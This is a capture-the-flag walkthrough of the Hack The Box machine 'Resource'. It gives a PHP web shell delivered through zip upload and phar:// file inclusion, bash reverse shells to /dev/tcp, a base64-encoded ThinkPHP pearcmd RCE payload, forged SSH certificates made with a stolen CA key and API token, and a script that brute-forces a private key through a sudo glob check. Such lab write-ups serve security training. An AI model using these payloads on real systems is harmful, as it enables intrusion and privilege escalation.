---
description: Linux 🔮 Medium
cover: https://i.pinimg.com/564x/81/db/6b/81db6b8a7780257b9273d7026b311e1e.jpg
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Resource

## Recon&#x20;

### Nmap

<figure><img src="../../../.gitbook/assets/nmap.png" alt=""><figcaption></figcaption></figure>

We can see two <mark style="color:red;">**`ssh`**</mark> ports (port 22 and port 2222). And we can judge that port 2222 may be very suspicious

After doing some Google searches, I noticed that port 2222 with OpenSSH version 8.9p1 can bypass authentication and access remote systems without proper credentials. (You can read more about it [here](https://ubuntu.com/security/CVE-2024-6387))

### Web app - [http://itrc.ssg.htb/](http://itrc.ssg.htb/)

> The SSH IT Resource Center is a centralized hub tailored to effortlessly address all your IT needs. Our resource center is the definitive one-stop-shop for resolving website issues, managing SSH access, tackling virus removal, and addressing various security concerns.&#x20;

On the main page, we can register and log in to the dashboard:&#x20;

<figure><img src="../../../.gitbook/assets/htb_resource_1_dashboard.png" alt=""><figcaption></figcaption></figure>

By looking into the URL we find out there could be path traversing using conventional paths:&#x20;

<figure><img src="../../../.gitbook/assets/ffuf-0.png" alt=""><figcaption></figcaption></figure>

With that information, we can use <mark style="color:red;">**`ffuf`**</mark>it with cookies to find hidden directories:&#x20;

<figure><img src="../../../.gitbook/assets/ffuf-1.png" alt=""><figcaption></figcaption></figure>

We get some exploitable directories, let try to access <mark style="color:red;">**`/admin`**</mark> endpoint to see all Tickets and use the Admin Tool.&#x20;

We can check some closed keys in case there is something hint for us to exploit:&#x20;

<figure><img src="../../../.gitbook/assets/close-ticket.png" alt=""><figcaption></figcaption></figure>

Detect a user providing SSH<mark style="color:red;">**`zzinter`**</mark>:

<figure><img src="../../../.gitbook/assets/htb_resource_5_0_admin.png" alt=""><figcaption></figcaption></figure>

We can try creating a ticket add an <mark style="color:red;">**`empty.zip`**</mark> file and submit. It leaks some server information with endpoint <mark style="color:red;">**`/api/create_ticket.php`**</mark>**&#x20;:**

* Create an empty ZIP file:

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

* Upload it and find <mark style="color:red;">**`/api/create_ticket.php`**</mark>:

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

When the <mark style="color:red;">**`ZipArchive::open()`**</mark> method is invoked, it attempts to open the uploaded ZIP file. The server then processes the contents of this ZIP file, which could involve tasks such as extracting files, reading their contents, or executing other relevant operations.

In this context:

1. **Deprecation Warning:** If the ZIP file is empty or invalid, <mark style="color:red;">**`ZipArchive::open()`**</mark> triggers a deprecation warning, indicating that using empty files with this method is no longer recommended and might be unsupported in future versions.
2. **File Access Issue:** The <mark style="color:red;">**`hash_file()`**</mark> function, intended to compute the hash of a file within the ZIP archive, throws a warning if it encounters issues accessing the file, such as when the file is missing or unreadable.
3. **Header Modification Warning:** Additionally, there’s a warning related to headers, which occurs because the script tries to modify HTTP headers after the output has already been sent to the browser. This could result from the warnings being output before the script attempts to send the headers.

I tried clicking on the previously submitted ticket and then clicking on the .zip file I used to make sure I could run it when I uploaded it. Then I realized something unexpected the name I gave the .zip file had been changed to a hash.

<figure><img src="../../../.gitbook/assets/sha1-zip (1).png" alt=""><figcaption></figcaption></figure>

It does not change when we upload the same ZIP file, indicating that the server uses some specific algorithms to hash the files. Download the ZIP file and Intercept the request. Copy the file name and we can try to identify its hash type:

<figure><img src="../../../.gitbook/assets/hash-id-check-test2.png" alt=""><figcaption></figcaption></figure>

We have determined the hash type and format for uploading our file. The question here is **whether there are any more files in there.**

### FastAPI

Enumerate for subdomains:

<figure><img src="../../../.gitbook/assets/ffuf-2.png" alt=""><figcaption></figcaption></figure>

We got [http://signserv.ssg.htb/](http://signserv.ssg.htb/)

When we try to visit it in the browser, we get 404 responses. So let's try to fuzz for the directory:

<figure><img src="../../../.gitbook/assets/ffuf-3.png" alt=""><figcaption></figcaption></figure>

Now we have a valid URL: [http://signserv.ssg.htb/docs](http://signserv.ssg.htb/docs)

<figure><img src="../../../.gitbook/assets/fast-api.png" alt=""><figcaption></figcaption></figure>

FastAPI is a modern, fast (high-performance), web framework for building APIs with Python based on standard Python-type hints.

{% hint style="info" %}
More information about [FastAPI](https://fastapi.tiangolo.com/)
{% endhint %}

## LFI&#x20;

We can create a simple PHP code to test if we can do RCE:

```php
<?php system($_GET["cmd"]); ?>
```

Zip it to test.zip and upload it to a new ticket. With the LFI vulnerability, we can try the <mark style="color:red;">**`phar://`**</mark> protocol to access the malicious PHP file. For example:&#x20;

```bash
http://itrc.ssg.htb/?page=phar://uploads/<SHA1SUM>.zip/test&cmd=whoami
```

<figure><img src="../../../.gitbook/assets/2024-08-07 18_02_57-Kali - VMware Workstation.png" alt=""><figcaption></figcaption></figure>

Now run the PHP reverse shell code:&#x20;

```php
/bin/bash -c 'bash -i >& /dev/tcp/<your_ip>/<lport> 0>&1'
```

URL encode that and put it in Burp:&#x20;

<figure><img src="../../../.gitbook/assets/burp-zip-rev.png" alt=""><figcaption></figcaption></figure>

Send the request and we have a shell as <mark style="color:orange;">**`www-data`**</mark>

<figure><img src="../../../.gitbook/assets/rev-shell.png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
More information about the [Phar Deserialization attack](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
{% endhint %}

### ThinkPHP - RCE

There's another way to get a shell that uses [ThinkPHP RCE](https://github.com/Mr-xn/thinkphp_lang_RCE?tab=readme-ov-file). The [article](https://tttang.com/archive/1865/) explains a Remote Code Execution (RCE) vulnerability in ThinkPHP versions 5. x and 6. x when the multi-language feature is enabled. Attackers can exploit this vulnerability by manipulating language parameters in the URL, headers, or cookies to achieve directory traversal and file inclusion. Specifically, we can include the <mark style="color:red;">**pearcmd**</mark> file in the ThinkPHP framework to execute arbitrary code on the server.  This is reported as [CVE-2022-47945](https://nvd.nist.gov/vuln/detail/CVE-2022-47945), so we can exploit it to get RCE.

We can generate the shell by following [this](https://github.com/Mr-xn/thinkphp_lang_RCE?tab=readme-ov-file):&#x20;

```bash
/bin/bash -c 'bash -i > /dev/tcp/10.10.16.36/4444 0>&1'
```

Base64 encodes for the <mark style="color:red;">**`shell_exec`**</mark> function. So we can have a payload like this:&#x20;

```sh
/index.php?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTYuMzYvNDQ0NCAwPiYxJw=="));?>+/tmp/shell.php
```

Send the request using BurpSuite:&#x20;

<figure><img src="../../../.gitbook/assets/RCE.png" alt=""><figcaption></figcaption></figure>

Note: We need to edit the Header language as <mark style="color:red;">**`Accept-Language: zl-Ch,zh`**</mark>

Navigate to [http://itrc.ssg.htb/index.php?page=../../../../../../../../tmp/shell](http://itrc.ssg.htb/index.php?page=../../../../../../../../tmp/shell) and we will get the shell.

## Msainristil - ITRC <a href="#toc-head-8" id="toc-head-8"></a>

By viewing <mark style="color:red;">db.php</mark> we find out credentials for the local database and know the next target from <mark style="color:red;">/home</mark>:

<figure><img src="../../../.gitbook/assets/next_target (1).png" alt=""><figcaption></figcaption></figure>

Now we can access to <mark style="color:orange;">**`www-data`**</mark> let's answer the question we asked earlier:&#x20;

<figure><img src="../../../.gitbook/assets/uploads_folder.png" alt=""><figcaption></figcaption></figure>

There are a lot of files here. But to see the content of each file will take us time so we can use this:&#x20;

```python
for zipfile in uploads/*.zip; do zipgrep "msainristil" "$zipfile"; done
```

<figure><img src="../../../.gitbook/assets/read_file_zip.png" alt=""><figcaption></figcaption></figure>

We can use that creds to SSH login:&#x20;

<figure><img src="../../../.gitbook/assets/ssh_msa.png" alt=""><figcaption></figcaption></figure>

## Zzinter - ITRC

There's an RSA keypair (<mark style="color:red;">**`ca-itrc & ca-itrc.pub`**</mark>) inside the <mark style="color:red;">**decommission\_old\_ca**</mark> folder, which is a CA private key (it could be uploaded via a closed ticket named decommission ITRC SSH Certificate from our previous [Recon](resource.md#recon))

{% hint style="info" %}
The <mark style="color:red;">**`ca-itrc.pub`**</mark> file itself does not contain any user-specific information or certificates. It is simply the public key part of the key pair that can be used to verify signatures made by the corresponding private key. We can create and sign a public key with the CA private key and then inspect the resulting certificate.
{% endhint %}

A Certificate Authority (CA) is an entity that stores, signs, and issues [digital certificates](https://en.wikipedia.org/wiki/Public_key_certificate). A digital certificate certifies the ownership of a public key by the named subject of the certificate. This allows others (relying parties) to rely upon signatures or on assertions made about the private key that corresponds to the certified public key. To know how SSH works with CA you can read [here](https://dmuth.medium.com/ssh-at-scale-cas-and-principals-b27edca3a5d)

Different from the SSH private key, the CA private key can sign other public keys, creating certificates that the system trusts.&#x20;

So now the idea is:&#x20;

{% code overflow="wrap" fullWidth="false" %}
```
1) Create your public key using ssh-keygen
2) Sign that public key using the certificate as any user in the target server (Public key signing is the process of using a certificate authority's (CA) private key to authenticate and certify a public key, proving that the public key belongs to a specific user or system.) 
3) Use your private key and the generated cert file to log in as the user you signed in to the target server
```
{% endcode %}

Following that idea, we can access to the second user:&#x20;

* Generate a new RSA keypair and sign the public key with the CA private key:

<figure><img src="../../../.gitbook/assets/keypar.png" alt=""><figcaption></figcaption></figure>

* We can use this signed keypair to SSH login as <mark style="color:red;">**`zzinter`**</mark>. Before that, we always need to modify the permissions on the keys to 600, then:

<figure><img src="../../../.gitbook/assets/ssh-zzinter-itrc.png" alt=""><figcaption></figcaption></figure>

* Get user flag:&#x20;

<figure><img src="../../../.gitbook/assets/user-flag.png" alt=""><figcaption></figcaption></figure>

## Root - ITRC

Use the same method in Msainristil shell, but now the principle of the certificate is <mark style="color:orange;">**`root`**</mark>:

<pre class="language-bash"><code class="lang-bash"><strong>ssh-keygen -t rsa -b 2048 -f rootkey \
</strong>ssh-keygen -s ca-itrc -I ca-itrc.pub -n root rootkey.pub \
ssh -o CertificateFile=rootkey-cert.pub -i rootkey root@localhost 
</code></pre>

<figure><img src="../../../.gitbook/assets/root-itrc.png" alt=""><figcaption></figcaption></figure>

## Support - SSG

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

As shown in the image, we are connecting to '127.223.0.3', while '0.0.0.0:22' remains in LISTEN status. Several indicators suggest that this environment might be a container:

* **Internal Network IP (172.223.0.3)**: This IP range is commonly used for container networking, indicating an isolated internal network.
* **Loopback Interface with High Port (127.0.0.11:38881)**: This suggests internal service networking, which is typical in containerized environments. Moreover, 127.0.0.11 is often the DNS nameserver for the workstation, as observed in <mark style="color:red;">**`/etc/resolv.conf`**</mark>.
* **Service Isolation**: Only limited services (such as Apache and SSH) are running, and internal connections are present, which is a common characteristic of containerized applications.

As a root user, we can now have all access to the file system. There's <mark style="color:red;">**`sign_key_api.sh`**</mark> from the home directory of  <mark style="color:red;">**`zzinter`**</mark>:&#x20;

```bash
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"

```

Let's take a look at how it works:

**Usage:** requires three arguments: <mark style="color:purple;">**`<public_key_file>`**</mark>, <mark style="color:purple;">**`<username>`**</mark>, <mark style="color:purple;">**`<principal>`**</mark>

**Variables:**&#x20;

* <mark style="color:purple;">**`public_key_file`**</mark>: Path to the public key file.
* <mark style="color:purple;">**`username`**</mark>: Username for the certificate.
* <mark style="color:purple;">**`principal_str`**</mark>: Comma-separated string of principals.

**Username:** <mark style="color:orange;">**`webserver`**</mark>, <mark style="color:orange;">**`analytics`**</mark>, <mark style="color:orange;">**`support`**</mark> and <mark style="color:orange;">**`security`**</mark>

**cURL Request:**&#x20;

* Send a request to <mark style="color:red;">**`signserv.ssg.htb/v1/sign`**</mark> to sign the public key, including the username and principals in the request body
* Use an Authorization token for the API

Let back to [http://signserv.ssg.htb/docs](http://signserv.ssg.htb/docs). It tells us how to access the API by using cURL:&#x20;

<figure><img src="../../../.gitbook/assets/fastapi-1.png" alt=""><figcaption></figcaption></figure>

Execute that and we will get the request. Since we have the principal and token via the script above, we can create an RSA and sign it via <mark style="color:red;">**`/v1/sign`**</mark>

```bash
ssh-keygen -t rsa -b 2048 -f key && chmod 600 key
```

{% hint style="info" %}
Copy the content of <mark style="color:red;">**`key.pub`**</mark> to the curl command
{% endhint %}

```bash
curl -X 'POST' \
  'http://signserv.ssg.htb/v1/sign' \
  -H 'accept: text/plain' \
  -H 'Content-Type: application/json' \
  -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE" \
  -d '{
  "pubkey": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCKor2dznpKLpt6EDM+YOE94cD00tkvELQ7/a+0C7rWFAChJRoNCna2JiuSJOTtawkf74uMM+xqwBtYhfBSHsTNlNCmsDFsdlRefNA6+OjYeNNMBueY1k+m09MbXBI6FHg5t40kXnLdveuY6r429kFD1DVrUnXsu8cye5bHwoTA8QNV0pTYViAvCF6HfFPTBfWMyzb/ZSZr2cup06yFCOpKzGHIATQYhUc/QkcxJFXIbWs+ZBPZDlntgvUEDJe8av3TH+i3TZur6uZkHEILOfKFaHGb7r+akQTbyeqa20xWIGHu1is7TM9EM+LJTQkb70FnXktYKR1io/KZwiEmIQFz kali@kali",
  "principals": "support",
  "username": "support"
}' \
> key-cert.pub
```

There are 4 principals ( webserver, analytics, support, security) with their corresponding usernames introduced in the explanation of the script. Only the support pair will work.

Since port 22 is for the host <mark style="color:red;">**`itrc`**</mark>, we can try to use the private key to log in to another SSH port 2222:

```bash
ssh -o CertificateFile=key-cert.pub -i key support@ssg.htb -p 2222
```

<figure><img src="../../../.gitbook/assets/support-ssg.png" alt=""><figcaption></figcaption></figure>

We are now in the host <mark style="color:red;">**`ssg`**</mark>

## Zzinter - SSG

We can enter <mark style="color:red;">**`/etc/ssh/auth_principals`**</mark> directory which is typically used for OpenSSH Certificate Authentication. Each file in this directory corresponds to a principal name and contains the list of allowed principals for the corresponding user.

<figure><img src="../../../.gitbook/assets/support-ssg-2.png" alt=""><figcaption></figcaption></figure>

This means we can specify principal matches to the username when creating and signing the SSH certificate. Because of that reason, we can use the same process before accessing.

To make the connection quick and convenient, I will write a script to automate the above process:

```bash
#!/bin/bash

ssh-keygen -t rsa -b 2048 -f key -N "" && chmod 600 key

# Extract the public key
PUB_KEY=$(cat key.pub)

# Make the API call to sign the key
curl -X 'POST' \
  'http://signserv.ssg.htb/v1/sign' \
  -H 'accept: text/plain' \
  -H 'Content-Type: application/json' \
  -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE" \
  -d "{
  \"pubkey\": \"$PUB_KEY\",
  \"principals\": \"zzinter_temp\",
  \"username\": \"zzinter\"
}" \
> key-cert.pub && \
chmod 600 key-cert.pub

# Log in with cert
ssh -o CertificateFile=key-cert.pub -i key zzinter@ssg.htb -p 2222
```



Run the script and we can access <mark style="color:red;">**`zzinter-ssg`**</mark>:

<figure><img src="../../../.gitbook/assets/zzinter-ssg.png" alt=""><figcaption></figcaption></figure>

## Root - SSG

A <mark style="color:orange;">**`zzinter`**</mark> user has a <mark style="color:red;">**`sudo`**</mark> privilege on ssg to run <mark style="color:red;">**`/opt/sign_key.sh`**</mark> with no password:

<figure><img src="../../../.gitbook/assets/zzinter-ssg-2.png" alt=""><figcaption></figcaption></figure>

```bash
#!/bin/bash

usage () {
    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
    exit 1
}

if [ "$#" -ne 5 ]; then
    usage
fi

ca_file="$1"
public_key_file="$2"
username="$3"
principal="$4"
serial="$5"

if [ ! -f "$ca_file" ]; then
    echo "Error: CA file '$ca_file' not found."
    usage
fi

if [[ $ca == "/etc/ssh/ca-it" ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if ! [[ $serial =~ ^[0-9]+$ ]]; then
    echo "Error: '$serial' is not a number."
    usage
fi

ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principals" "$public_key_name"
```

The script above intends to stop us from using the <mark style="color:red;">**`ca-it`**</mark> key by comparing our provided CA and the original one inside <mark style="color:red;">**`/etc/ssh`**</mark> directory.&#x20;

Let's analyze it a little more deeply:

*   **Usage Function:**

    ```bash
    usage () {
        echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
        exit 1
    }
    ```

    * This function displays a usage message and exits if the script is not run with the correct number of arguments or if the arguments are invalid. It requires 5 arguments: the CA file, public key file, username, principal, and serial number.
*   **Check Number of Arguments:**

    ```bash
    if [ "$#" -ne 5 ]; then
        usage
    fi
    ```

    * If the number of arguments is not exactly 5, the script calls the <mark style="color:red;">**`usage`**</mark> function and exits.
*   **Assign Variables:**

    ```bash
    ca_file="$1"
    public_key_file="$2"
    username="$3"
    principal="$4"
    serial="$5"
    ```

    * The input arguments are assigned to variables: <mark style="color:red;">**`ca_file`**</mark>, <mark style="color:red;">**`public_key_file`**</mark>, <mark style="color:red;">**`username`**</mark>, <mark style="color:red;">**`principal`**</mark>, and <mark style="color:red;">**`serial`**</mark>.
*   **Check CA File Existence:**

    ```bash
    if [ ! -f "$ca_file" ]; then
        echo "Error: CA file '$ca_file' not found."
        usage
    fi
    ```

    * If the CA file does not exist, the script displays an error message and exits.
*   **Check for Specific CA (**<mark style="color:red;">**`/etc/ssh/ca-it`**</mark>**):**

    ```bash
    if [[ $ca == "/etc/ssh/ca-it" ]]; then
        echo "Error: Use API for signing with this CA."
        usage
    fi

    itca=$(cat /etc/ssh/ca-it)
    ca=$(cat "$ca_file")
    if [[ $itca == $ca ]]; then
        echo "Error: Use API for signing with this CA."
        usage
    fi

    ```

    * This part of the script checks if the CA file provided is the specific file <mark style="color:red;">**`/etc/ssh/ca-it`**</mark>. If it is, the script warns the user to use an API for signing instead and exits. It compares the contents of the provided CA file and the <mark style="color:red;">**`/etc/ssh/ca-it`**</mark> file to ensure they are not the same.
*   **Check Public Key File Existence:**

    ```bash
    if [ ! -f "$public_key_file" ]; then
        echo "Error: Public key file '$public_key_file' not found."
        usage
    fi

    ```

    * If the public key file does not exist, the script displays an error message and exits.
*   **Validate `principal`:**

    ```bash
    supported_principals="webserver,analytics,support,security"
    IFS=',' read -ra principal <<< "$principal_str"
    for word in "${principal[@]}"; do
        if ! echo "$supported_principals" | grep -qw "$word"; then
            echo "Error: '$word' is not a supported principal."
            echo "Choose from:"
            echo "    webserver - external web servers - webadmin user"
            echo "    analytics - analytics team databases - analytics user"
            echo "    support - IT support server - support user"
            echo "    security - SOC servers - support user"
            echo
            usage
        fi
    done
    ```

    * This part checks whether the <mark style="color:red;">**`principal`**</mark> provided by the user is among the supported principals: <mark style="color:red;">**`webserver`**</mark>, <mark style="color:red;">**`analytics`**</mark>, <mark style="color:red;">**`support`**</mark>, <mark style="color:red;">**`security`**</mark>. If not, it shows an error message and lists the valid options.
*   **Validate `serial`:**

    ```bash
    if ! [[ $serial =~ ^[0-9]+$ ]]; then
        echo "Error: '$serial' is not a number."
        usage
    fi
    ```

    * This part checks if the <mark style="color:red;">**`serial`**</mark> is a valid number. If it's not, the script displays an error message and exits.
*   **Sign the Public Key:**

    ```bash
    ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principals" "$public_key_name"
    ```

    * Finally, the script uses the <mark style="color:red;">**`ssh-keygen`**</mark> command to sign the public key with the provided CA file, serial number, username, and principals. This command generates a certificate for the public key.

We attempt to brute-force the original key by trying each base64 character and appending them one by one with a wildcard <mark style="color:orange;">**`*`**</mark> at the end.

```python
import subprocess

def reconstruct_ssh_key(header, footer, ba64chars, key_length, sign_key_script, public_key_file, user, principal, serial):
    key = []
    line = 0
    
    while True:
        for char in ba64chars:
            # Construct a test key with *
            testKey = f"{header}\n{''.join(key)}{char}*"
            with open("ca-test", "w") as f:
                f.write(testKey)
                
            proc = subprocess.run(
                ["sudo", sign_key_script, "ca-test", public_key_file, user, principal, serial],
                capture_output=True
            )
            
            # If matched, Error code 1
            if proc.returncode == 1:
                key.append(char)
                # Add a newline every 70 characters
                if len(key) > 1 and (len(key) - line) % 70 == 0:
                    key.append("\n")
                    line += 1
                break
        else:
            break
    
    # Construct the final SSH key from the discovered characters
    caKey = f"{header}\n{''.join(key)}\n{footer}"
    print(caKey)
    with open("ca-it", "w") as f:
        f.write(caKey)
    return caKey

# Usage
header = "-----BEGIN OPENSSH PRIVATE KEY-----"
footer = "-----END OPENSSH PRIVATE KEY-----"
ba64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
key_length = 70  # Typically the key is 70 characters per line

# Parameters for the signing process
sign_key_script = "/opt/sign_key.sh"
public_key_file = "mmb.pub"
user = "root"
principal = "root_user"
serial = "1"

# Call the function
reconstructed_key = reconstruct_ssh_key(header, footer, ba64chars, key_length, sign_key_script, public_key_file, user, principal, serial)
```

Let's analyze it a bit

*   **Main Loop for Finding the Correct Characters:**

    ```python
        while True:
            for char in ba64chars:
                # Construct a test key with *
                testKey = f"{header}\n{''.join(key)}{char}*"
                with open("ca-test", "w") as f:
                    f.write(testKey)
    ```

    * <mark style="color:red;">**`while True`**</mark>: An infinite loop that continues until the correct SSH key is fully reconstructed or no more valid characters are found.
    * <mark style="color:red;">**`for char in ba64chars`**</mark>: Loops through each character in the <mark style="color:red;">**`ba64chars`**</mark> string (which contains all possible base64 characters: A-Z, a-z, 0-9, +, /, =).
    * <mark style="color:red;">**`testKey = f"{header}\n{''.join(key)}{char}*"`**</mark>: Constructs a temporary SSH key (<mark style="color:red;">**`testKey`**</mark>) for validation. This key consists of:
      * The <mark style="color:red;">**`header`**</mark> (e.g., "-----BEGIN OPENSSH PRIVATE KEY-----").
      * The characters in `key` that have already been identified as correct.
      * The current character being tested (<mark style="color:red;">**`char`**</mark>).
      * A <mark style="color:red;">**`*`**</mark> at the end to indicate that the key is still incomplete.

    #### The Role of <mark style="color:red;">`*`</mark>:

    * The <mark style="color:red;">**`*`**</mark> character is added at the end of the temporary key to signify that the key is incomplete. This is crucial because:
      * It helps the script understand that the key is still being constructed, allowing the testing of individual characters.
      * The <mark style="color:red;">**`*`**</mark> ensures that the script doesn't prematurely validate an incomplete key as correct.
*   **Running the Script to Validate the Key:**

    ```python
                proc = subprocess.run(
                    ["sudo", sign_key_script, "ca-test", public_key_file, user, principal, serial],
                    capture_output=True
                )

                # If matched, Error code 1
                if proc.returncode == 1:
                    key.append(char)
                    # Add a newline every 70 characters
                    if len(key) > 1 and (len(key) - line) % 70 == 0:
                        key.append("\n")
                        line += 1
                    break
            else:
                break
    ```

    * <mark style="color:red;">**`subprocess.run`**</mark>: Runs the <mark style="color:red;">**`sign_key_script`**</mark> with the necessary parameters, including the temporary key stored in <mark style="color:red;">**`ca-test`**</mark>.
    * <mark style="color:red;">**`proc.returncode == 1`**</mark>: If the script returns a code of <mark style="color:red;">**`1`**</mark>, it indicates that the temporary key (with the current character) is valid.
    * <mark style="color:red;">**`key.append(char)`**</mark>: If the character is correct, it is added to the <mark style="color:red;">**`key`**</mark> list. The <mark style="color:red;">**`*`**</mark> is **not** added to <mark style="color:red;">**`key`**</mark>, meaning it only exists temporarily for validation purposes.
    * **Newline Handling**: After every 70 characters, a newline () is added to maintain the correct SSH key format.

    #### Importance of the <mark style="color:red;">`*`</mark>:

    * The <mark style="color:red;">**`*`**</mark> is only used within the <mark style="color:red;">**`testKey`**</mark> during the validation process. It allows the system to recognize that the key is incomplete and continues to iterate through possible characters without finalizing the key prematurely.
*   **Constructing and Saving the Final SSH Key:**

    ```python
        caKey = f"{header}\n{''.join(key)}\n{footer}"
        print(caKey)
        with open("ca-it", "w") as f:
            f.write(caKey)
        return caKey
    ```

    * <mark style="color:red;">**`caKey = f"{header}\n{''.join(key)}\n{footer}"`**</mark>: This line constructs the final SSH key by concatenating the <mark style="color:red;">**`header`**</mark>, the characters in <mark style="color:red;">**`key`**</mark>, and the <mark style="color:red;">**`footer`**</mark>. Since the <mark style="color:red;">**`*`**</mark> was never added to <mark style="color:red;">**`key`**</mark>, it does not appear in the final key.
    * <mark style="color:red;">**`print(caKey)`**</mark>: Outputs the final reconstructed SSH key.
    * <mark style="color:red;">**`with open("ca-it", "w") as f:`**</mark>: Saves the final SSH key to the file <mark style="color:red;">**`ca-it`**</mark>.
    * <mark style="color:red;">**`return caKey`**</mark>: Returns the final SSH key.

Ok let's get back to the main issue

Generate the RSA keypair before running <mark style="color:red;">**`exploit.py`**</mark>&#x20;

<figure><img src="../../../.gitbook/assets/exploit.png" alt=""><figcaption></figcaption></figure>

Then following this:&#x20;

```bash
chmod 600 ca-it
ssh-keygen -s ca-it -z 1234 -I root -V -100w:forever -n root_user rootkey.pub
ssh -o CertificateFile=rootkey-cert.pub -i rootkey root@localhost -p 2222
```

{% hint style="info" %}
If you have an error:

```
Load key "ca-it": error in libcrypt
```

-> Try to edit the ca-it file correct order of a key file
{% endhint %}

And then we got <mark style="color:red;">**`root`**</mark>:

<figure><img src="../../../.gitbook/assets/root-flag.png" alt=""><figcaption></figcaption></figure>
